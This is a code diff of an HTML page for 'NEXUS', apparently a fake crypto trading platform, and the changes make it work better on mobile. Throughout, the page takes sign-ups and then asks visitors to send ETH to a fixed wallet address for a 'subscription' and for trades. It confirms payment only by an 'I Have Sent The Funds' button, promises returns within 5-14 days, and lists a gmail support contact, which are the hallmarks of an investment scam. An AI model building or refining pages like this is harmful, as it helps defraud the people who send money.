@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS // Trading City</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NEXUS // Capital Management Terminal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
     
@@ -28,13 +28,18 @@
             font-family: 'Rajdhani', sans-serif;
             overflow-x: hidden;
             min-height: 100vh;
+            -webkit-tap-highlight-color: transparent;
         }
 
         .font-mono { font-family: 'Space Mono', monospace; }
 
+        /* Safe Area Padding for iOS Devices */
+        .pb-safe { padding-bottom: max(0.5rem, env(safe-area-inset-bottom)); }
+        .pt-safe { padding-top: max(0px, env(safe-area-inset-top)); }
+
         /* Animated Particle Mesh Background */
         #bg-mesh {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vw;
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             z-index: -2; opacity: 0.5; pointer-events: none;
         }
 
@@ -65,7 +70,7 @@
         .crypto-card {
             background: rgba(255, 255, 255, 0.02);
             border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 12px; padding: 18px; cursor: pointer;
+            border-radius: 12px; padding: 16px; cursor: pointer;
             transition: all 0.25s cubic-bezier(0.2, 0.8, 0.2, 1);
         }
         .crypto-card:hover {
@@ -84,7 +89,8 @@
             width: 100%; background: rgba(0, 0, 0, 0.7);
             border: 1px solid rgba(0, 240, 255, 0.2);
             padding: 14px; color: var(--primary); outline: none; transition: 0.3s;
-            font-family: 'Space Mono', monospace; font-size: 14px;
+            font-family: 'Space Mono', monospace; 
+            font-size: 16px !important; /* CRITICAL: Prevents iOS auto-zoom */
             clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
         }
         .cyber-input:focus { border-color: var(--primary); background: rgba(0, 240, 255, 0.04); box-shadow: 0 0 12px rgba(0, 240, 255, 0.15); }
@@ -108,8 +114,8 @@
         input[type=range] { -webkit-appearance: none; width: 100%; background: transparent; }
         input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 2px; background: rgba(0, 240, 255, 0.25); }
         input[type=range]::-webkit-slider-thumb {
-            -webkit-appearance: none; height: 16px; width: 16px; background: var(--primary);
-            cursor: pointer; box-shadow: 0 0 12px var(--primary); transform: rotate(45deg) translateY(-7px); transition: 0.15s;
+            -webkit-appearance: none; height: 20px; width: 20px; background: var(--primary);
+            cursor: pointer; box-shadow: 0 0 12px var(--primary); transform: rotate(45deg) translateY(-9px); transition: 0.15s;
         }
 
         /* View Setup Configurations */
@@ -130,91 +136,114 @@
     <div class="ambient-glow glow-left"></div>
     <div class="ambient-glow glow-right"></div>
 
-    <!-- MAIN HUD HEADER -->
-    <header class="fixed top-0 w-full z-50 bg-[#020204]/80 backdrop-blur-xl border-b border-[#00F0FF]/15">
-        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
-            <div class="flex items-center gap-2 sm:gap-4">
-                <div class="w-9 h-9 bg-[#00F0FF] flex items-center justify-center shadow-[0_0_15px_rgba(0,240,255,0.4)]" style="clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);">
-                    <svg class="w-5 h-5 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5"><path d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+    <!-- MAIN HUD HEADER (Cleaned for Mobile) -->
+    <header class="fixed top-0 w-full z-50 bg-[#020204]/90 backdrop-blur-xl border-b border-[#00F0FF]/15 pt-safe">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 py-3 sm:py-4 flex justify-between items-center">
+            <!-- Header Left -->
+            <div class="flex items-center gap-3">
+                <div class="w-8 h-8 sm:w-9 sm:h-9 bg-[#00F0FF] flex items-center justify-center shadow-[0_0_15px_rgba(0,240,255,0.4)] flex-shrink-0" style="clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);">
+                    <svg class="w-4 h-4 sm:w-5 sm:h-5 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5"><path d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                 </div>
-                <span class="font-bold text-2xl tracking-widest text-white glitch-header uppercase hidden sm:block">Nexus</span>
-                
-                <!-- UNIVERSAL SUPPORT BUTTON -->
-                <button onclick="openSupportModal()" class="ml-2 sm:ml-4 px-3 py-1.5 bg-[#A020F0]/10 text-[#A020F0] border border-[#A020F0]/40 hover:bg-[#A020F0] hover:text-white transition rounded text-xs font-bold uppercase tracking-widest font-mono shadow-[0_0_15px_rgba(160,32,240,0.2)]">Support</button>
-                
-                <!-- LATE SUBSCRIPTION BUTTON -->
-                <button onclick="openLateSubModal()" class="px-3 py-1.5 bg-[#00F0FF]/10 text-[#00F0FF] border border-[#00F0FF]/40 hover:bg-[#00F0FF] hover:text-black transition rounded text-xs font-bold uppercase tracking-widest font-mono shadow-[0_0_15px_rgba(0,240,255,0.2)]">Pay Sub</button>
+                <span class="font-bold text-xl sm:text-2xl tracking-widest text-white glitch-header uppercase">Nexus</span>
             </div>
             
-            <div class="flex items-center gap-8">
-                <!-- User Internal Nav Panel Links -->
-                <div id="user-nav" class="hidden md:flex items-center gap-8 text-sm font-bold tracking-widest uppercase">
-                    <button onclick="navTo('view-dashboard')" id="nav-dash" class="text-[#00F0FF] hover:text-white transition">Trading Dashboard</button>
-                    <button onclick="navTo('view-faq')" id="nav-faq" class="text-slate-500 hover:text-[#00F0FF] transition flex items-center gap-2">
-                        FAQ Center
-                    </button>
+            <!-- Header Right -->
+            <div class="flex items-center gap-4 sm:gap-6">
+                <!-- Desktop Buttons ONLY (Hidden on Mobile for cleanliness) -->
+                <div class="hidden md:flex items-center gap-4">
+                    <button onclick="openSupportModal()" class="px-3 py-1.5 bg-[#A020F0]/10 text-[#A020F0] border border-[#A020F0]/40 hover:bg-[#A020F0] hover:text-white transition rounded text-xs font-bold uppercase tracking-widest font-mono shadow-[0_0_15px_rgba(160,32,240,0.2)]">Support</button>
+                    <button onclick="openLateSubModal()" class="px-3 py-1.5 bg-[#00F0FF]/10 text-[#00F0FF] border border-[#00F0FF]/40 hover:bg-[#00F0FF] hover:text-black transition rounded text-xs font-bold uppercase tracking-widest font-mono shadow-[0_0_15px_rgba(0,240,255,0.2)]">Pay Sub</button>
+                </div>
+
+                <!-- Desktop User Internal Nav Panel Links -->
+                <div id="user-nav" class="hidden md:flex items-center gap-6 text-sm font-bold tracking-widest uppercase">
+                    <button onclick="navTo('view-dashboard')" id="nav-dash" class="text-[#00F0FF] hover:text-white transition">Dashboard</button>
+                    <button onclick="navTo('view-faq')" id="nav-faq" class="text-slate-500 hover:text-[#00F0FF] transition">FAQ Center</button>
                     <button onclick="executeLogout()" class="text-xs text-slate-500 hover:text-white transition border-l border-white/10 pl-4">LOGOUT</button>
                 </div>
-                <!-- Security Node Badge -->
-                <div id="status-badge" class="text-[11px] font-mono px-3 py-1.5 border border-[#FF003C]/40 text-[#FF003C] bg-[#FF003C]/10 uppercase font-bold shadow-[0_0_12px_rgba(255,0,60,0.15)]">
-                    ACCOUNT LOCKED
+                <!-- Universal Security Node Badge -->
+                <div id="status-badge" class="text-xs font-mono px-3 py-1.5 border border-[#FF003C]/40 text-[#FF003C] bg-[#FF003C]/10 uppercase font-bold shadow-[0_0_12px_rgba(255,0,60,0.15)] flex-shrink-0 text-center">
+                    LOCKED
                 </div>
             </div>
         </div>
     </header>
 
-    <!-- CONTAINER SHELL CONTEXT -->
-    <main class="flex-grow pt-32 pb-12 px-4 max-w-7xl mx-auto w-full flex flex-col justify-center relative z-10">
+    <!-- MOBILE BOTTOM NAVIGATION (Native App Feel) -->
+    <div id="mobile-nav" class="hidden md:hidden fixed bottom-0 left-0 w-full bg-[#020204]/95 backdrop-blur-xl border-t border-[#00F0FF]/20 z-40 justify-around items-center pt-2 pb-safe">
+        <button onclick="navTo('view-dashboard')" id="mobile-nav-dash" class="mobile-nav-btn w-1/5 text-[#00F0FF] flex flex-col items-center gap-1 text-[11px] uppercase font-bold tracking-widest transition-colors py-1">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z"></path></svg>
+            Dash
+        </button>
+        <button onclick="navTo('view-faq')" id="mobile-nav-faq" class="mobile-nav-btn w-1/5 text-slate-500 hover:text-[#00F0FF] flex flex-col items-center gap-1 text-[11px] uppercase font-bold tracking-widest transition-colors py-1">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+            FAQ
+        </button>
+        <button onclick="openLateSubModal()" class="mobile-nav-btn w-1/5 text-slate-500 hover:text-[#00F0FF] flex flex-col items-center gap-1 text-[11px] uppercase font-bold tracking-widest transition-colors py-1">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
+            Sub
+        </button>
+        <button onclick="openSupportModal()" class="mobile-nav-btn w-1/5 text-slate-500 hover:text-[#A020F0] flex flex-col items-center gap-1 text-[11px] uppercase font-bold tracking-widest transition-colors py-1">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+            Support
+        </button>
+        <button onclick="executeLogout()" class="w-1/5 text-slate-500 hover:text-[#FF003C] flex flex-col items-center gap-1 text-[11px] uppercase font-bold tracking-widest transition-colors py-1">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
+            Exit
+        </button>
+    </div>
+
+    <!-- MAIN CONTENT SHELL -->
+    <main class="flex-grow pt-24 pb-28 md:pt-32 md:pb-12 px-4 max-w-7xl mx-auto w-full flex flex-col justify-center relative z-10">
 
         <!-- STEP 1: ACCOUNT INITIALIZATION CREATION & LOGIN -->
         <div id="view-auth" class="view-section active flex-col items-center justify-center w-full max-w-md mx-auto">
-            <div class="glass-panel p-10 w-full text-center">
+            <div class="glass-panel p-8 sm:p-10 w-full text-center">
                 <h2 id="auth-title" class="text-3xl font-bold mb-2 uppercase tracking-widest text-[#00F0FF]">Create Account</h2>
-                <p id="auth-subtitle" class="text-slate-400 text-xs mb-4 font-mono uppercase tracking-wider">Initialize User Profile Setup</p>
+                <p id="auth-subtitle" class="text-slate-400 text-xs mb-5 font-mono uppercase tracking-wider">Initialize User Profile Setup</p>
                 
-                <div id="auth-toggle-btn" onclick="toggleAuthMode()" class="text-xs text-[#00F0FF] cursor-pointer hover:text-white mb-6 uppercase tracking-widest font-bold">
+                <div id="auth-toggle-btn" onclick="toggleAuthMode()" class="text-sm text-[#00F0FF] cursor-pointer hover:text-white mb-6 uppercase tracking-widest font-bold">
                     [ Switch to Secure Login ]
                 </div>
 
-                <form id="auth-form" onsubmit="handleAuth(event)" class="space-y-4">
+                <form id="auth-form" onsubmit="handleAuth(event)" class="space-y-5">
                     <input type="email" id="auth-email" required class="cyber-input text-center" placeholder="SECURE EMAIL ADDRESS">
                     <input type="text" id="auth-user" required class="cyber-input text-center uppercase" placeholder="CHOOSE USERNAME">
                     <input type="password" id="auth-pass" required class="cyber-input text-center" placeholder="PASSWORD">
                     <input type="password" id="auth-pass-confirm" required class="cyber-input text-center" placeholder="CONFIRM PASSWORD">
-                    <button type="submit" id="auth-submit-btn" class="cyber-btn mt-4">Create Account</button>
+                    <button type="submit" id="auth-submit-btn" class="cyber-btn mt-2 py-4">Create Account</button>
                 </form>
             </div>
         </div>
 
         <!-- STEP 2: SUBSCRIPTION REGISTRATION ACCESS PORTAL GATEWAY -->
-        <div id="view-sub" class="view-section flex-col lg:flex-row gap-12 items-center max-w-5xl mx-auto w-full">
-            <div class="flex-1">
-                <div class="inline-block px-4 py-1.5 border border-[#00F0FF]/30 bg-[#00F0FF]/10 text-[#00F0FF] text-xs font-bold mb-6 font-mono uppercase tracking-widest shadow-[0_0_12px_rgba(0,240,255,0.2)]">Activation Required</div>
-                <h2 class="text-5xl font-bold mb-6 leading-tight uppercase">Unlock the<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-[#00F0FF] to-[#A020F0]">Trading Terminal</span></h2>
-                <p class="text-slate-300 mb-8 leading-relaxed text-lg">
+        <div id="view-sub" class="view-section flex-col lg:flex-row gap-8 lg:gap-12 items-center max-w-5xl mx-auto w-full">
+            <div class="flex-1 text-center lg:text-left">
+                <div class="inline-block px-4 py-2 border border-[#00F0FF]/30 bg-[#00F0FF]/10 text-[#00F0FF] text-xs font-bold mb-4 sm:mb-6 font-mono uppercase tracking-widest shadow-[0_0_12px_rgba(0,240,255,0.2)]">Activation Required</div>
+                <h2 class="text-4xl sm:text-5xl font-bold mb-4 sm:mb-6 leading-tight uppercase">Unlock the<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-[#00F0FF] to-[#A020F0]">Trading Terminal</span></h2>
+                <p class="text-slate-300 mb-6 sm:mb-8 leading-relaxed text-sm sm:text-lg">
                     Welcome, <span id="welcome-user" class="text-white font-bold uppercase"></span>. To enable fund routing, you must maintain an active access subscription. We deduct a flat 5% platform fee strictly from your generated profit returns.
                 </p>
-                <div class="glass-panel p-6 flex justify-between items-center border-l-4 border-l-[#00F0FF] bg-black/40">
-                    <div>
-                        <div class="font-bold text-xl text-white uppercase tracking-wider">Monthly Subscription Pass</div>
+                <div class="glass-panel p-5 sm:p-6 flex flex-col sm:flex-row justify-between items-center border-l-4 border-l-[#00F0FF] bg-black/40 gap-4 sm:gap-0">
+                    <div class="text-center sm:text-left">
+                        <div class="font-bold text-lg sm:text-xl text-white uppercase tracking-wider">Monthly Pass</div>
                         <div class="text-xs text-slate-400 font-mono mt-1 uppercase">Platform Infrastructure Access</div>
                     </div>
                     <div class="text-4xl font-mono font-bold text-[#00F0FF] drop-shadow-[0_0_10px_rgba(0,240,255,0.4)]">$15</div>
                 </div>
             </div>
             
-            <div class="flex-1 glass-panel p-10 w-full text-center">
+            <div class="flex-1 glass-panel p-6 sm:p-10 w-full text-center">
                 <h3 class="font-bold text-2xl mb-2 uppercase tracking-widest text-white">Crypto Gateway</h3>
                 <p class="text-xs text-slate-400 mb-6 font-mono uppercase">Scan or copy payment address</p>
                 
-                <div class="bg-black/50 p-2 inline-block mx-auto mb-6 rounded-xl border border-white/10 shadow-lg">
-                    <!-- ETH SUBSCRIPTION IMAGE -->
-                    <img src="https://cdn.corenexis.com/f/9SWeMXzQ0ad.png" alt="ETH QR Code" class="w-48 rounded-lg">
+                <div class="bg-black/50 p-3 inline-block mx-auto mb-6 rounded-xl border border-white/10 shadow-lg">
+                    <img src="https://cdn.corenexis.com/f/9SWeMXzQ0ad.png" alt="ETH QR Code" class="w-40 sm:w-48 rounded-lg">
                 </div>
                 
                 <div class="mb-8">
-                    <p class="text-xs text-[#00F0FF] uppercase tracking-widest mb-2 font-bold font-mono">Send Exactly $15 in ETH (Not 15 ETH)</p>
-                    <div class="cyber-input text-xs text-center select-all tracking-wider font-mono text-white">0xb9363D794ccE0D151C1a3236C3829113275B2aDA</div>
+                    <p class="text-xs text-[#00F0FF] uppercase tracking-widest mb-2 font-bold font-mono">Send Exactly $15 in ETH</p>
+                    <div class="cyber-input text-xs sm:text-sm text-center select-all tracking-wider font-mono text-white break-all p-3">0xb9363D794ccE0D151C1a3236C3829113275B2aDA</div>
                 </div>
                 
                 <button id="sub-btn-submit" onclick="submitPayment()" class="cyber-btn py-4">I Have Sent The Funds</button>
@@ -223,47 +252,49 @@
 
         <!-- STEP 4: TRADING PROTOCOL MATRIX DASHBOARD -->
         <div id="view-dashboard" class="view-section flex-col gap-6 w-full">
-            <div class="flex justify-between items-end mb-2 border-b border-white/10 pb-4">
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-end mb-2 border-b border-white/10 pb-4 gap-4 sm:gap-0">
                 <div>
-                    <h2 class="text-3xl font-bold uppercase tracking-widest text-white">Trading Dashboard</h2>
-                    <p class="text-slate-400 text-sm">Select from exactly 150 real cryptocurrencies parsed by the engine.</p>
+                    <h2 class="text-3xl font-bold uppercase tracking-widest text-white">Dashboard</h2>
+                    <p class="text-slate-400 text-sm">Select from 150 real cryptocurrencies parsed by the engine.</p>
                 </div>
                 <div id="api-status" class="text-xs font-mono text-[#00F0FF] flex items-center gap-2 bg-[#00F0FF]/10 px-4 py-2 rounded border border-[#00F0FF]/30 shadow-[0_0_15px_rgba(0,243,255,0.2)]">
-                    <span class="w-1.5 h-1.5 rounded-full bg-[#00F0FF] animate-pulse"></span> SYSTEM OK // 150 INDEXES
+                    <span class="w-1.5 h-1.5 rounded-full bg-[#00F0FF] animate-pulse"></span> SYSTEM OK
                 </div>
             </div>
 
-            <div class="grid lg:grid-cols-12 gap-8 items-start">
+            <!-- Reversed on Mobile: Calculator Top (Order 1), Grid Bottom (Order 2) -->
+            <div class="flex flex-col lg:grid lg:grid-cols-12 gap-8 items-start">
                 
                 <!-- 150 Index Grid Display Configuration -->
-                <div class="lg:col-span-8 glass-panel overflow-hidden flex flex-col h-[750px]">
-                    <div class="flex bg-black/60 border-b border-white/10">
-                        <button onclick="switchMarketTab('pop')" id="tab-pop" class="flex-1 py-4 font-bold text-[#00F0FF] border-b-2 border-[#00F0FF] transition text-md uppercase tracking-wider bg-white/5">Top 75 Popular</button>
-                        <button onclick="switchMarketTab('vol')" id="tab-vol" class="flex-1 py-4 font-bold text-slate-500 border-b-2 border-transparent hover:text-white transition text-md uppercase tracking-wider">Top 75 Movers</button>
+                <!-- Removed mobile scroll trap (h-[60vh] / overflow-y-auto), lets page naturally scroll instead -->
+                <div class="order-2 lg:order-1 lg:col-span-8 glass-panel flex flex-col h-auto lg:h-[750px] w-full">
+                    <div class="flex bg-black/60 border-b border-white/10 shrink-0">
+                        <button onclick="switchMarketTab('pop')" id="tab-pop" class="flex-1 py-4 font-bold text-[#00F0FF] border-b-2 border-[#00F0FF] transition text-sm sm:text-md uppercase tracking-wider bg-white/5">Top 75 Popular</button>
+                        <button onclick="switchMarketTab('vol')" id="tab-vol" class="flex-1 py-4 font-bold text-slate-500 border-b-2 border-transparent hover:text-white transition text-sm sm:text-md uppercase tracking-wider">Top 75 Movers</button>
                     </div>
                     
-                    <div class="flex-grow p-6 overflow-y-auto" id="grid-wrapper">
-                        <div id="coin-grid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4">
+                    <div class="flex-grow p-4 sm:p-6 overflow-visible lg:overflow-y-auto" id="grid-wrapper">
+                        <div id="coin-grid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3 sm:gap-4">
                             <!-- Injected safely through native JS DOM listeners -->
                         </div>
                     </div>
                 </div>
 
                 <!-- Live Mathematical Calculator Execution Box -->
-                <div class="lg:col-span-4 glass-panel p-8 sticky top-32">
-                    <h3 class="font-bold text-xl mb-6 border-b border-white/10 pb-4 tracking-widest uppercase">Trade Settings</h3>
+                <div class="order-1 lg:order-2 lg:col-span-4 glass-panel p-6 sm:p-8 lg:sticky lg:top-32 w-full">
+                    <h3 class="font-bold text-xl mb-4 sm:mb-6 border-b border-white/10 pb-4 tracking-widest uppercase">Trade Settings</h3>
                     
                     <!-- Selected Coin Telemetry Layout -->
-                    <div class="bg-black/50 border border-white/10 rounded-xl p-5 mb-6 flex items-center gap-4">
+                    <div class="bg-black/50 border border-white/10 rounded-xl p-4 sm:p-5 mb-6 flex items-center gap-4">
                         <div id="calc-ph" class="w-12 h-12 rounded border border-dashed border-slate-600 flex items-center justify-center text-xs text-slate-500 font-mono font-bold">NONE</div>
                         <img id="calc-img" src="" class="w-12 h-12 rounded-full hidden shadow-[0_0_10px_rgba(255,255,255,0.1)]">
                         <div class="flex-grow overflow-hidden">
-                            <div id="calc-sym" class="font-bold text-2xl text-white truncate uppercase tracking-wide">Select Asset</div>
+                            <div id="calc-sym" class="font-bold text-xl sm:text-2xl text-white truncate uppercase tracking-wide">Select Asset</div>
                             <div id="calc-price" class="text-xs text-slate-400 font-mono mt-1">$0.00</div>
                         </div>
                         <div class="text-right flex-shrink-0">
                             <div class="text-[10px] text-slate-500 uppercase tracking-widest mb-1">24H Delta</div>
-                            <div id="calc-change" class="font-bold font-mono text-base text-slate-500">--</div>
+                            <div id="calc-change" class="font-bold font-mono text-sm sm:text-base text-slate-500">--</div>
                         </div>
                     </div>
 
@@ -288,172 +319,151 @@
                             <span class="uppercase text-xs">Our 5% Fee (Gains Only):</span><span id="math-fee">-$0.00</span>
                         </div>
                         <div class="flex justify-between items-center pt-1 text-white">
-                            <span class="font-sans font-bold text-base uppercase tracking-wider">Total Return Payout:</span>
+                            <span class="font-sans font-bold text-base uppercase tracking-wider">Return Payout:</span>
                             <span id="math-total" class="font-bold text-2xl text-[#00F0FF] drop-shadow-[0_0_10px_rgba(0,240,255,0.4)]">$100.00</span>
                         </div>
                     </div>
 
                     <button onclick="openDeploymentModal()" class="cyber-btn py-4">Start Trading</button>
-                    <p class="text-[10px] text-slate-500 mt-4 text-center uppercase tracking-wider leading-relaxed">
+                    <p class="text-[11px] text-slate-500 mt-4 text-center uppercase tracking-wider leading-relaxed">
                         Projections map directly to absolute 24H database changes. Platform fee applies strictly to profits.
                     </p>
                 </div>
             </div>
         </div>
 
-        <!-- STEP 5: FAQ VIEW (REPLACING PORTFOLIO) -->
+        <!-- STEP 5: FAQ VIEW -->
         <div id="view-faq" class="view-section flex-col gap-6 w-full max-w-5xl mx-auto">
             <div class="border-b border-white/10 pb-4 mb-4">
-                <h2 class="text-4xl font-bold uppercase tracking-widest text-white">Frequently Asked Questions</h2>
-                <p class="text-slate-400 text-md">Platform guidelines, payout structures, and support information.</p>
+                <h2 class="text-4xl font-bold uppercase tracking-widest text-white">FAQ</h2>
+                <p class="text-slate-400 text-sm">Platform guidelines, payout structures, and support information.</p>
             </div>
 
             <div class="grid gap-6">
-                <!-- FAQ Item 1 -->
                 <div class="glass-panel p-6 bg-black/40 border-l-4 border-[#00F0FF]">
-                    <h3 class="font-bold text-white text-lg tracking-wide uppercase mb-2">How long does it take to receive my returns?</h3>
-                    <p class="text-slate-400 font-mono text-sm">It typically takes around 5-14 days to get the traded money back to your crypto account, depending on the market graphs of the specific crypto asset. You can track live market data on <a href="https://coinmarketcap.com/" target="_blank" class="text-[#00F0FF] hover:underline hover:text-white transition">CoinMarketCap</a>.</p>
+                    <h3 class="font-bold text-white text-lg tracking-wide uppercase mb-2">How long does it take to receive returns?</h3>
+                    <p class="text-slate-400 font-mono text-sm">It typically takes around 5-14 days to get the traded money back to your crypto account, depending on market graphs. Track live data on <a href="https://coinmarketcap.com/" target="_blank" class="text-[#00F0FF] hover:underline hover:text-white transition">CoinMarketCap</a>.</p>
                 </div>
                 
-                <!-- FAQ Item 2 -->
                 <div class="glass-panel p-6 bg-black/40 border-l-4 border-[#A020F0]">
                     <h3 class="font-bold text-white text-lg tracking-wide uppercase mb-2">Where do my withdrawals go?</h3>
                     <p class="text-slate-400 font-mono text-sm">For strict security measures, all funds and generated yields are automatically sent directly back to the exact crypto account they were originally sent from.</p>
                 </div>
 
-                <!-- FAQ Item 3 -->
                 <div class="glass-panel p-6 bg-black/40 border-l-4 border-[#00FF00]">
                     <h3 class="font-bold text-white text-lg tracking-wide uppercase mb-2">Is there a refund policy?</h3>
                     <p class="text-slate-400 font-mono text-sm">Yes, we offer a strict 2-day money-back guarantee on your initial deposit if you choose to cancel before trades are executed.</p>
                 </div>
 
-                <!-- FAQ Item 4 -->
                 <div class="glass-panel p-6 bg-black/40 border-l-4 border-[#00F0FF]">
                     <h3 class="font-bold text-white text-lg tracking-wide uppercase mb-2">How do I track my active investments?</h3>
                     <p class="text-slate-400 font-mono text-sm">You will receive an automated email notification every time our traders buy or sell a coin using your invested capital.</p>
                 </div>
 
-                <!-- FAQ Item 5 -->
                 <div class="glass-panel p-6 bg-black/40 border-l-4 border-[#A020F0]">
                     <h3 class="font-bold text-white text-lg tracking-wide uppercase mb-2">How does the access subscription work?</h3>
                     <p class="text-slate-400 font-mono text-sm">The terminal access subscription must be renewed every month to maintain active fund routing and dashboard capabilities.</p>
                 </div>
 
-                <!-- FAQ Item 6 -->
                 <div class="glass-panel p-6 bg-black/40 border-l-4 border-[#FF003C]">
                     <h3 class="font-bold text-white text-lg tracking-wide uppercase mb-2">How can I contact support?</h3>
-                    <p class="text-slate-400 font-mono text-sm">Our support team is available 24/7. You can use the "SUPPORT" button at the top of the terminal to open a secure ticket, or email us directly at <b class="text-white">nexustrading@gmail.com</b>.</p>
+                    <p class="text-slate-400 font-mono text-sm">Our support team is available 24/7. Use the "Support" button in the navigation to open a ticket, or email <b class="text-white">nexustrading@gmail.com</b>.</p>
                 </div>
             </div>
         </div>
 
     </main>
 
-    <!-- LATE SUBSCRIPTION MODAL (GLOBAL) -->
-    <div id="late-sub-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[300] hidden items-center justify-center p-4">
-        <div class="glass-panel p-10 max-w-md w-full relative border-[#00F0FF]/30 shadow-[0_0_50px_rgba(0,240,255,0.25)] text-center">
-            <button onclick="closeLateSubModal()" class="absolute top-4 right-5 text-slate-400 hover:text-white text-xl font-bold">✕</button>
-            
-            <h3 class="text-2xl font-bold uppercase tracking-widest text-white mb-2 text-center text-transparent bg-clip-text bg-gradient-to-r from-[#00F0FF] to-blue-500">Activate Subscription</h3>
+    <!-- MODALS (Max Heights configured to prevent off-screen content on small phones) -->
+
+    <!-- LATE SUBSCRIPTION MODAL -->
+    <div id="late-sub-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[300] hidden items-center justify-center p-4 pt-safe pb-safe">
+        <div class="glass-panel p-8 max-w-md w-full relative border-[#00F0FF]/30 shadow-[0_0_50px_rgba(0,240,255,0.25)] text-center max-h-[85vh] overflow-y-auto">
+            <button onclick="closeLateSubModal()" class="absolute top-4 right-5 text-slate-400 hover:text-white text-2xl font-bold p-2">✕</button>
+            <h3 class="text-2xl font-bold uppercase tracking-widest text-white mb-2 mt-4 text-center text-transparent bg-clip-text bg-gradient-to-r from-[#00F0FF] to-blue-500">Activate Subscription</h3>
             <p class="text-slate-400 text-xs mb-6 font-mono text-center uppercase">Monthly Platform Access Fee</p>
-            
-            <div class="bg-black/50 p-2 rounded-2xl inline-block mx-auto mb-6 border border-white/10 shadow-lg">
-                <!-- ETH SUBSCRIPTION IMAGE -->
-                <img src="https://cdn.corenexis.com/f/9SWeMXzQ0ad.png" alt="ETH QR Code" class="w-48 rounded-lg">
+            <div class="bg-black/50 p-3 rounded-2xl inline-block mx-auto mb-6 border border-white/10 shadow-lg">
+                <img src="https://cdn.corenexis.com/f/9SWeMXzQ0ad.png" alt="ETH QR Code" class="w-40 rounded-lg">
             </div>
-            
             <div class="mb-8">
-                <p class="text-xs text-[#00F0FF] uppercase tracking-widest mb-2 font-bold font-mono">Send Exactly $15 in ETH (Not 15 ETH)</p>
-                <div class="cyber-input text-xs text-center select-all tracking-wider font-mono text-white">0xb9363D794ccE0D151C1a3236C3829113275B2aDA</div>
+                <p class="text-xs text-[#00F0FF] uppercase tracking-widest mb-2 font-bold font-mono">Send Exactly $15 in ETH</p>
+                <div class="cyber-input text-xs sm:text-sm text-center select-all tracking-wider font-mono text-white break-all p-3">0xb9363D794ccE0D151C1a3236C3829113275B2aDA</div>
             </div>
-            
-            <button onclick="submitLateSub()" class="cyber-btn">I Have Sent The Funds</button>
+            <button onclick="submitLateSub()" class="cyber-btn py-4">I Have Sent The Funds</button>
         </div>
     </div>
 
-    <!-- INVEST FUNDING PROTOCOL GATE MODAL (QR CODE + WALLET) -->
-    <div id="deploy-modal" class="fixed inset-0 bg-black/95 backdrop-blur-xl z-[100] hidden items-center justify-center p-4">
-        <div class="glass-panel p-10 max-w-md w-full relative text-center border-[#00F0FF]/20 shadow-[0_0_50px_rgba(0,240,255,0.2)]">
-            <button onclick="closeDeploymentModal()" class="absolute top-4 right-5 text-slate-400 hover:text-white text-xl font-bold">✕</button>
-            <h3 class="text-2xl font-bold uppercase tracking-widest text-white mb-2">Fund Trade Deployment</h3>
-            <p id="deploy-desc" class="text-slate-400 text-sm mb-6 font-mono"></p>
-
